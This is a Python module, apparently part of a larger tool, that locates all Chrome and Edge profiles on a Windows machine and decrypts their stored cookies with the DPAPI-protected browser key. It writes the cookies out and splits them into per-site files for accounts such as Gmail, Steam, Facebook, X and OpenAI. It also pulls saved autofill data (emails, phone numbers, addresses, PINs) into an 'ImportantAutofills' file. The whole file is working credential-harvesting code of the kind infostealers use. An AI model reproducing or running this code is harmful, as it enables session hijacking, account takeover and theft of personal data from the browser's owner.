"""
Browser Cookies Extractor Module
Refactored from cookies.py for better integration
"""

import os
import json
import base64
import shutil
import sqlite3
import tempfile
from pathlib import Path
from typing import Iterable, Tuple, Callable, List, Dict, Set
from collections import defaultdict
import re

SITE_FILTERS = {
    "gmail": ("gmail.com", "google.com", "accounts.google.com"),
    "steam": ("steampowered.com", "steamcommunity.com", "steam.com"),
    "youtube": ("youtube.com", "ytimg.com", "googlevideo.com"),
    "facebook": ("facebook.com", "fb.com", "messenger.com"),
    "instagram": ("instagram.com",),
    "tiktok": ("tiktok.com",),
    "x": ("x.com", "twitter.com", "t.co"),
    "openai": ("openai.com",),
    # add more as you need...
}

AUTOFILL_NAME_PATTERNS = [
    r"email", r"e-mail", r"mail",
    r"phone", r"tel", r"mobile",
    r"first[_-]?name", r"last[_-]?name", r"full[_-]?name", r"name\[first\]", r"name\[last\]",
    r"address", r"street", r"city", r"state", r"region", r"province",
    r"postal", r"zipcode", r"zip", r"postcode",
    r"billing", r"shipping",
    r"pin", r"reg[_-]?email", r"emailField", r"change_email",
]

try:
    from Crypto.Cipher import AES  # pycryptodome
except Exception:
    AES = None

try:
    import win32crypt  # pywin32
except Exception:
    win32crypt = None  # will error later with a clear message


def convert_to_netscape_time(ts):
    """Convert timestamp to Netscape cookie file format (seconds since epoch)."""
    try:
        return str(int(ts)) if ts else "0"
    except Exception:
        return "0"


def iter_cookies_from(callable_fetch: Callable[[], Iterable],
                      label: str,
                      suppress: bool = True) -> Iterable[Tuple]:
    """
    Yield cookies in Netscape tuple.
    If suppress=True, catches exceptions and logs; if False, lets exceptions bubble up.
    """
    def _iter():
        for c in callable_fetch():
            yield (
                c.domain,
                "TRUE" if c.domain.startswith(".") else "FALSE",
                c.path,
                "TRUE" if getattr(c, "secure", False) else "FALSE",
                convert_to_netscape_time(getattr(c, "expires", 0)),
                c.name,
                c.value,
            )

    if suppress:
        try:
            yield from _iter()
        except Exception as e:
            print(f"[{label}] Skipped: {e!s}")
    else:
        yield from _iter()


def chromium_profile_paths(vendor: str):
    """
    Yield tuples (cookie_file, key_file, profile_name) for all profiles of a Chromium-based browser on Windows.
    Tries both 'Network/Cookies' and legacy 'Cookies'.
    vendor examples: 'Google/Chrome', 'Microsoft/Edge'
    """
    base = Path(os.getenv("LOCALAPPDATA", "")) / vendor / "User Data"
    key_file = base / "Local State"
    if not base.exists():
        return

    candidates = [base / "Default"] + sorted(p for p in base.glob("Profile *") if p.is_dir())
    for prof in candidates:
        cookies_new = prof / "Network" / "Cookies"
        cookies_old = prof / "Cookies"
        if cookies_new.exists():
            yield cookies_new, key_file, prof.name
        elif cookies_old.exists():
            yield cookies_old, key_file, prof.name


def with_temp_copy(src: Path) -> Path:
    """Copy DB to a temp file to avoid locks; return temp path."""
    tmpdir = Path(tempfile.mkdtemp(prefix="ck_"))
    dst = tmpdir / src.name
    try:
        shutil.copy2(src, dst)
        return dst
    except Exception as e:
        print(f"[Copy] Could not copy DB '{src}': {e!s}. Will try direct read.")
        return src

def _require_crypto_deps():
    if AES is None:
        raise RuntimeError("pycryptodome is not available. Install with: pip install pycryptodome")
    if win32crypt is None:
        raise RuntimeError("pywin32 is not available. Install with: pip install pywin32")


def load_chromium_key(key_file: Path) -> bytes:
    """Get AES key from 'Local State' using DPAPI."""
    _require_crypto_deps()
    try:
        with open(key_file, "r", encoding="utf-8") as f:
            js = json.load(f)
        ek_b64 = js["os_crypt"]["encrypted_key"]
        ek = base64.b64decode(ek_b64)[5:]  # strip 'DPAPI'
        key = win32crypt.CryptUnprotectData(ek, None, None, None, 0)[1]
        if not key:
            raise RuntimeError("DPAPI returned empty key")
        return key
    except Exception as e:
        print(f"[Key] Failed to load/decrypt AES key from '{key_file}': {e!s}")
        return b""


def decrypt_chromium_value(enc: bytes, key: bytes) -> str:
    """
    Decrypt Chromium cookie value.
    Supports 'v10'/'v11'/'v20' headers: 3-byte header + 12-byte nonce + ciphertext + 16-byte tag.
    Legacy format: DPAPI blob.
    """
    _require_crypto_deps()
    if not enc:
        return ""
    try:
        hdr = enc[:3]
        if len(hdr) == 3 and hdr[0:1] == b"v" and all(48 <= b <= 57 for b in hdr[1:3]):
            nonce = enc[3:15]
            ct = enc[15:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ct[:-16], ct[-16:]).decode("utf-8", "ignore")
        dec = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1]
        return dec.decode("utf-8", "ignore")
    except Exception:
        return ""


def chrome_expires_utc_to_unix(expires_utc: int) -> int:
    """
    Chromium stores expires_utc in microseconds since 1601-01-01.
    Convert to seconds since Unix epoch.
    """
    if not expires_utc or expires_utc <= 0:
        return 0
    return (expires_utc - 11644473600000000) // 1000000


def _b2s(x):
    """Return str for mixed bytes/str inputs."""
    if isinstance(x, (bytes, bytearray, memoryview)):
        return bytes(x).decode("utf-8", "ignore")
    return x or ""


def iter_chromium_cookies_direct(cookie_db: Path, key_file: Path, label: str) -> Iterable[Tuple]:
    """
    Yield Netscape tuples reading the SQLite DB directly (fallback without browser_cookie3).
    """
    key = load_chromium_key(key_file)
    if not key:
        print(f"[{label}] Skipped: cannot obtain AES key")
        return

    src = with_temp_copy(cookie_db)
    try:
        with sqlite3.connect(str(src)) as conn:
            conn.row_factory = sqlite3.Row
            cur = conn.execute("""
                SELECT
                    host_key AS domain,
                    path,
                    is_secure,
                    expires_utc,
                    name,
                    value,
                    CAST(encrypted_value AS BLOB) AS encrypted_value
                FROM cookies
            """)
            for r in cur:
                ts = chrome_expires_utc_to_unix(int(r["expires_utc"] or 0))
                val = r["value"] or ""
                if not val:
                    encv = r["encrypted_value"]
                    if encv is not None:
                        if isinstance(encv, memoryview):
                            encv = encv.tobytes()
                        elif isinstance(encv, str):
                            encv = encv.encode("latin1", "ignore")
                        val = decrypt_chromium_value(encv, key) or ""

                yield (
                    _b2s(r["domain"]),
                    "TRUE" if _b2s(r["domain"]).startswith(".") else "FALSE",
                    _b2s(r["path"]),
                    "TRUE" if r["is_secure"] else "FALSE",
                    convert_to_netscape_time(ts),
                    _b2s(r["name"]),
                    _b2s(val),
                )
    except Exception as e:
        print(f"[{label}] Fallback read failed: {e!s}")

def profile_dir_from_cookie_db(cookie_db: Path) -> Path:
    """
    Infer profile directory from cookie DB path.
    - .../Profile X/Network/Cookies  -> Profile X
    - .../Profile X/Cookies          -> Profile X
    - .../Default/...                -> Default
    """
    parts = list(cookie_db.parts)
    # If path ends with .../<Profile>/Network/Cookies
    if len(parts) >= 3 and parts[-2] == "Network" and parts[-1] == "Cookies":
        return Path(*parts[:-2])  # drop 'Network/Cookies'
    # If path ends with .../<Profile>/Cookies
    if len(parts) >= 2 and parts[-1] == "Cookies":
        return Path(*parts[:-1])  # drop 'Cookies'
    return cookie_db.parent


def read_autofill_pairs_from_profile(profile_dir: Path) -> List[Tuple[str, str]]:
    """
    Read (name, value) pairs from Chromium 'Web Data' DB in the given profile.
    Uses table 'autofill' (form field name/value history).
    """
    web_data = profile_dir / "Web Data"
    if not web_data.exists():
        return []

    src = with_temp_copy(web_data)
    pairs: List[Tuple[str, str]] = []
    try:
        with sqlite3.connect(str(src)) as conn:
            conn.row_factory = sqlite3.Row
            try:
                cur = conn.execute("""
                    SELECT name, value
                    FROM autofill
                    WHERE name IS NOT NULL AND value IS NOT NULL
                    ORDER BY date_last_used DESC
                """)
            except sqlite3.OperationalError:
                cur = conn.execute("""
                    SELECT name, value
                    FROM autofill
                    WHERE name IS NOT NULL AND value IS NOT NULL
                """)

            for r in cur:
                n = (r["name"] or "").strip()
                v = (r["value"] or "").strip()
                if n and v:
                    pairs.append((n, v))
    except Exception as e:
        print(f"[Autofill] Failed reading Web Data at '{web_data}': {e!s}")
    return pairs


def filter_important_autofills(pairs: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
    """
    Keep only pairs whose name matches important patterns and values look reasonable.
    Deduplicate by (name, value) order-preserving.
    """
    if not pairs:
        return []

    rx = re.compile("|".join(AUTOFILL_NAME_PATTERNS), re.IGNORECASE)
    seen: Set[Tuple[str, str]] = set()
    out: List[Tuple[str, str]] = []
    for n, v in pairs:
        if len(v) > 200:
            continue
        if not rx.search(n):
            continue
        key = (n, v)
        if key in seen:
            continue
        seen.add(key)
        out.append((n, v))
    return out

def write_kv_file(path: Path, items: List[Tuple[str, str]]):
    """Write 'key: value' per line."""
    with open(path, "w", encoding="utf-8") as f:
        for k, v in items:
            f.write(f"{k}: {v}\n")

def make_chromium_label(vendor: str, prof_name: str, cookie_db: Path) -> str:
    """Return label like 'Google_[Chrome]_Default Network' or 'Microsoft_[Edge]_Profile 1 Network'."""
    if vendor.startswith("Google/Chrome"):
        prefix = "Google_[Chrome]"
    elif vendor.startswith("Microsoft/Edge"):
        prefix = "Microsoft_[Edge]"
    else:
        prefix = vendor
    loc = "Network" if any(p.name == "Network" for p in cookie_db.parents) else "Cookies"
    return f"{prefix}_{prof_name} {loc}"


def write_netscape_file(path: Path, items):
    """Write Netscape cookie file."""
    with open(path, "w", encoding="utf-8") as f:
        f.write("# Netscape HTTP Cookie File\n")
        for d in items:
            row = [x if x is not None else "" for x in d]
            f.write(f"{row[0]}\t{row[1]}\t{row[2]}\t{row[3]}\t{row[4]}\t{row[5]}\t{row[6]}\n")


def domain_matches_any(host: str, domains: Tuple[str, ...]) -> bool:
    """Check if host matches any of right-most domains."""
    if not host:
        return False
    h = host.lstrip(".").lower()
    for d in domains:
        d = d.lstrip(".").lower()
        if h == d or h.endswith("." + d) or h.endswith(d):
            return True
    return False


def filter_items_by_domains(items: List[Tuple], domains: Tuple[str, ...]) -> List[Tuple]:
    """Return only items whose domain matches any in domains."""
    out = []
    for row in items:
        domain = (row[0] or "")
        if domain_matches_any(domain, domains):
            out.append(row)
    return out

def get_browser_cookies(output_dir="Cookies"):
    """Collect cookies from Chrome and Edge, write per-profile files, per-site files, and ImportantAutofills."""
    # Late import: Firefox via browser_cookie3 is optional here (we're focusing on Chromium)
    try:
        import browser_cookie3 as bc3  # type: ignore
        bc3_version = getattr(__import__('browser_cookie3'), '__version__', 'unknown')
        print(f"[Info] browser_cookie3 version: {bc3_version}")
    except ImportError:
        bc3 = None
        print("[Warn] browser_cookie3 is not installed. Firefox will be skipped.")

    outdir = Path(output_dir)
    outdir.mkdir(parents=True, exist_ok=True)

    per_profile = defaultdict(list)  # key: label -> list of netscape tuples
    profile_dirs: Dict[str, Path] = {}

    # --- Chrome (enumerate all profiles) ---
    any_chrome = False
    for cookie_db, key_file, prof_name in chromium_profile_paths("Google/Chrome"):
        any_chrome = True
        copy_path = with_temp_copy(cookie_db)
        print(f"[Chrome] Using profile '{prof_name}': {cookie_db}")
        label_fs = make_chromium_label("Google/Chrome", prof_name, cookie_db)
        profile_dirs[label_fs] = profile_dir_from_cookie_db(cookie_db)

        used_bc3 = False
        batch = []
        if bc3 is not None:
            try:
                batch = list(
                    iter_cookies_from(
                        lambda p=copy_path, k=key_file: bc3.chrome(cookie_file=str(p), key_file=str(k)),
                        f"Chrome:{prof_name}",
                        suppress=False,
                    )
                )
                used_bc3 = True
            except Exception as e:
                print(f"[Chrome:{prof_name}] bc3 failed: {e!s}. Trying direct fallback.")

        if not used_bc3:
            batch = list(iter_chromium_cookies_direct(cookie_db, key_file, f"Chrome:{prof_name}"))

        if batch:
            per_profile[label_fs].extend(batch)

    if not any_chrome:
        print("[Chrome] No explicit profile paths found.")

    # --- Edge (enumerate all profiles) ---
    any_edge = False
    for cookie_db, key_file, prof_name in chromium_profile_paths("Microsoft/Edge"):
        any_edge = True
        copy_path = with_temp_copy(cookie_db)
        print(f"[Edge] Using profile '{prof_name}': {cookie_db}")
        label_fs = make_chromium_label("Microsoft/Edge", prof_name, cookie_db)
        profile_dirs[label_fs] = profile_dir_from_cookie_db(cookie_db)

        used_bc3 = False
        batch = []
        if bc3 is not None:
            try:
                batch = list(
                    iter_cookies_from(
                        lambda p=copy_path, k=key_file: bc3.edge(cookie_file=str(p), key_file=str(k)),
                        f"Edge:{prof_name}",
                        suppress=False,
                    )
                )
                used_bc3 = True
            except Exception as e:
                print(f"[Edge:{prof_name}] bc3 failed: {e!s}. Trying direct fallback.")

        if not used_bc3:
            batch = list(iter_chromium_cookies_direct(cookie_db, key_file, f"Edge:{prof_name}"))

        if batch:
            per_profile[label_fs].extend(batch)

    if not any_edge:
        print("[Edge] No explicit profile paths found.")

    total_files = 0
    total_rows = 0
    for label, items in per_profile.items():
        profile_path = outdir / f"{label}.txt"
        write_netscape_file(profile_path, items)
        print(f"[Write] {label}.txt  ({len(items)} rows)")
        total_files += 1
        total_rows += len(items)

        for site_label, domain_tuple in SITE_FILTERS.items():
            sub = filter_items_by_domains(items, domain_tuple)
            if not sub:
                continue
            site_path = outdir / f"{label}__{site_label}.txt"
            write_netscape_file(site_path, sub)
            print(f"[Write] {label}__{site_label}.txt  ({len(sub)} rows)")
            total_files += 1

        prof_dir = profile_dirs.get(label)
        if prof_dir:
            pairs = read_autofill_pairs_from_profile(prof_dir)
            important = filter_important_autofills(pairs)
            if important:
                autof_path = outdir / f"{label}__ImportantAutofills.txt"
                write_kv_file(autof_path, important)
                print(f"[Write] {label}__ImportantAutofills.txt  ({len(important)} lines)")
                total_files += 1

    print(f"[Done] Wrote {total_files} files into '{outdir.resolve()}', total cookie rows: {total_rows}")
    return True
